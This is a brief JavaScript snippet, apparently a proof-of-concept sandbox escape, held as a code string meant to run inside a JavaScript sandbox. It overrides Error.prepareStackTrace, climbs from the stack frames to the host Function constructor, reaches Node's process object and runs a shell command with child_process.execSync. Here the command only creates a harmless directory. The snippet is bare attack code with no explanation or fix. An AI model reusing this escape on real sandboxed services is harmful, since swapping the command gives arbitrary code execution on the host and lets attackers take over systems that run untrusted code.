const code2 = `
Error.prepareStackTrace = (e, frames) => {
    frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('mkdir this_is_poc');
};

async function poc(){
   return abc;
}

poc()
`;